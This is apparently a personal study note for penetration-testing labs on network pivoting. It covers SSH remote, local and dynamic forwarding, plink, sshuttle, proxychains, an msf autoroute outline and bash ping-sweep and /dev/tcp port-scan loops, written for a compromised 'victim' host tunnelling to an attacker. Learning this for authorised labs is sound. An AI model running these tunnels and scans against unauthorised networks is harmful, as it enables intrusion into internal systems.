[Labs](https://attackdefense.com/listing?labtype=linux-security-pivoting&subtype=linux-security-pivoting-basics)
[Cheatsheet](https://web.archive.org/web/20181108223619/https://bitrot.sh/cheatsheet/14-12-2017-pivoting/)
[Blog](https://medium.com/@6c2e6e2e/network-pivoting-like-a-pro-2fa04a569d8c)
[Red teamers guide to pivoting](https://web.archive.org/web/20181110130047/https://artkond.com/2017/03/23/pivoting-guide/)
[Bitrot](https://web.archive.org/web/20180405115503/https://bitrot.sh/)

[Lab](https://tryhackme.com/room/wreath)
[Lab](https://tryhackme.com/room/borderlands)
# SSH port forwarding

Port tunneling or forwarding is a networking technique that allows traffic between ocal and remote machine.
We use port tunneling when we either can’t reach a destination because it is protected behind a firewall or only accessible internally.

***LPF lets you to connect from your local computer to another server.** 
**RPF lets you connect from the remote SSH server to another server**.*

## Remote Forwarding
Exposing the internal services and interact with them from attacker machine.
so basically :

|Victim side|Attacker side|
|--|--|
|127.0.0.1:3306|192.168.0.106:8080|
|127.0.0.1:5900|192.168.0.106:5555|

With remote port forwarding attacker is the one listening locally for traffic from the compromised server.

`ssh -R RemortPort:localhost:localport attacker@192.168.0.106`

Commands will be ==executed on victim machine==:
```bash
ssh -R 8080:127.0.0.1:3306 attacker@192.168.0.106
ssh -R 5555:127.0.0.1:5900 attacker@192.168.0.106
```


## Local Forwarding
Making remote service available on local machine.
```bash
ssh -L local_port:remort_ip:remort_port victim@ip

ssh -L 5050:127.0.0.1:21 admin@10.10.10.90
```
means on attacker machine local port 5050 will be routed to port 21 of victim machine 10.10.10.90.
	
## Dynamic Port Forwarding
This can be used with proxychains to forward client traffic through the remote server

```bash
ssh -D8080 [user]@[host]
```

## Other tools

## **Plink local port forwarding:**
```bash
plink -l root -pw pass -R 3389:<localhost>:3389 <remote_host>
```

## **SSH local port forwarding:**
```bash
ssh -L 5555:127.0.0.1:7777 jarvis@0.stark.ml -p 22
```

**SSHuttle forwarding:** #todo
Its creates a proxy and uses SSH connection to create a tunnerlled proxy that acts like a new interface. *It simulates a VPN*
We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.

```bash
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
```
*this command connects us to subnet 10.1.1.0/24*

```bash
sshuttle -r user@10.10.10.10 -N
```
*This command connects us to subnet which it tries to find itself*

```bash
sshuttle -r user@10.10.10.10 --ssh-cmd "ssh -i id_rsa" subnet
```
*supply the private key in the command*

```bash
sshuttle -r user@10.10.10.10 subnet -x 172.16.0.5
```
*-x is used to exclude compromised machine*

> If you facing some error then use -x flag to exclude that IP from that tunnel

## Proxychains / SSH Proxy
Forward the port first with SSH:
```bash
ssh -D 8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
# -f : ssh in background
# -N : do not execute a remote command
```

Config File: `/etc/proxychains.conf`

```bash
[ProxyList]
socks4 localhost 8080
```


### If there is no way then use msf
****
web_delivery > autoroute > ping sweep > Will get all the internal services.
****

## FRP tool pivoting
#FRP Binary on aws server and then client bianry on local system then we can use this as tunnel between 
AWS NAT pr krna hai 

# Manual
To find out the avaiable hosts in linux we will do ping speep
`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`
Port Scanning:
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
by this simple script we will be able to find up hosts.

***So 3 ways:***
1. ssh from the machine to attacker (remote)
2. ssh from attacker to machine (local)
3. autoroute for internal ip running services.

![](https://i.imgur.com/aTxpNSI.png)

# Conclusion
- [ ]   Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- [ ]   SSH can be used to create both port forwards, and proxies
- [ ]   plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- [ ]   Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- [ ]   Chisel can do the exact same thing as with SSH portforwarding/tunneling, ==but doesn't require SSH access== on the box ==(Works without even Having SSH)==
- [ ]   sshuttle is a nicer way to create a proxy when we have SSH access on a target



# Wreath
**Contents**
- [ ] Code Analysis (Python and PHP)
- [ ] Locating and modifying public exploits  
- [ ]  Simple webapp enumeration and exploitation  
- [ ] Git Repository Analysis
- [ ] Simple Windows Post-Exploitation techniques
- [ ] CLI Firewall Administration (CentOS and Windows)
- [ ] Cross-Compilation techniques
- [ ] Coding wrapper programs
- [ ] Simple exfiltration techniques  
- [ ] Formatting a pentest report


